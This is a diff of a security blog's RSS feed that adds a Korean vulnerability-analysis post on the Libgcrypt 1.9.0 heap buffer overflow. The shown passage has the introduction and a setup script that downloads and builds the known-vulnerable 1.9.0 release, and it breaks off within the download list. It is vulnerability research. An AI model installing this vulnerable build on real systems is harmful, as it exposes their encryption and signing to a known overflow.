@@ -5,9 +5,422 @@
     <description>RAON Whitehat Core-Research-Team Blog</description>
     <link>http://202.182.127.225:4000/</link>
     <atom:link href="http://202.182.127.225:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 15 Feb 2021 02:44:15 +0000</pubDate>
-    <lastBuildDate>Mon, 15 Feb 2021 02:44:15 +0000</lastBuildDate>
+    <pubDate>Mon, 08 Mar 2021 07:19:49 +0000</pubDate>
+    <lastBuildDate>Mon, 08 Mar 2021 07:19:49 +0000</lastBuildDate>
     <generator>Jekyll v4.0.1</generator>
+    
+      <item>
+        <title>GPG, Heap BOF in Libgcrypt</title>
+        <description>&lt;p&gt;라온화이트햇 핵심연구팀 권재승&lt;/p&gt;
+
+&lt;h2 id=&quot;소개&quot;&gt;소개&lt;/h2&gt;
+
+&lt;p&gt;이 문서는 구글 프로젝트 제로팀에서 발견한 Libgcrypt 1.9.0 암호화 라이브러리의 &lt;code class=&quot;highlighter-rouge&quot;&gt;힙 버퍼 오버플로우&lt;/code&gt;에 대한 설명 및 분석 글입니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;gnupg-및-libgcrypt&quot;&gt;GnuPG 및 Libgcrypt&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_.png&quot; alt=&quot;/assets/202103/jae_.png&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GnuPG&lt;/code&gt;는 GNU 프로젝트 중 이메일 보안 표준으로 자리잡은 PGP를 대체하는 소프트웨어이다. 여기서 데이터 암호화 및 전자서명을 위해 Libcrypt 암호화 라이브러리를 사용하며, OpenSSL이나 LibreSSL만큼 널리 사용되는 암호화 툴킷은 아니나 Fedora나  Gento와 같은 많은 리눅스 배포판, 맥OS 패키지 관리자인 Homebrew에서 디지털 보안 목적으로 사용되고 있다. Libgcrypt는 기본적인 암호화 모드 및 알고리즘을 지원하며 GnuPG와 분리되어 개발되어 독립적으로 사용 가능하다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;환경세팅&quot;&gt;환경세팅&lt;/h2&gt;
+
+&lt;p&gt;Libgcrypt 1.9.0에서 발생한 &lt;code class=&quot;highlighter-rouge&quot;&gt;힙 오버플로우&lt;/code&gt;를 재현하기 위한 환경세팅 방법입니다. 해당 취약점은 오직 1.9.0버전(released 2021-01-19)에만 영향을 미치기 때문에 정확히 해당 버전을 설치해줄 필요가 있습니다.&lt;/p&gt;
+
+&lt;p&gt;Libgcrypt 1.9.0 환경 구성은 Ubuntu 18.04에서 진행하였으며 아래 스크립트를 사용하면 취약점이 있는 GPG 소프트웨어를 설치할 수 있습니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/bin/bash
+# ---------
+# Script to build and install GnuPG 2.2.x	
+# Setting libgcrypt-1.9.0
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#  libgnutls-dev
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bzip2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gettext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;texinfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gnutls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libgnutls28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;essential&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libbz2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib1g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libncurses5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libsqlite3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libldap2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libgnutls28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bzip2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gettext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;texinfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gnutls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;essential&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libbz2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib1g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libncurses5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libsqlite3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libldap2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg22&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gpg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gpg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyserver&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hkp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyserver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;249&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B39D24F25E3B6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04376&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F3EE0856959&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2071&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B08A33BD3F06&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A861B1C7EFD60D9&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgpg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgpg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgpg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgpg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_do_not_use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libgcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_do_not_use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libassuan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libassuan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libassuan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libassuan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libksba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libksba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libksba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libksba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bz2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
+&lt;span class=&quot;n&quot;&gt;wget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gcrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span 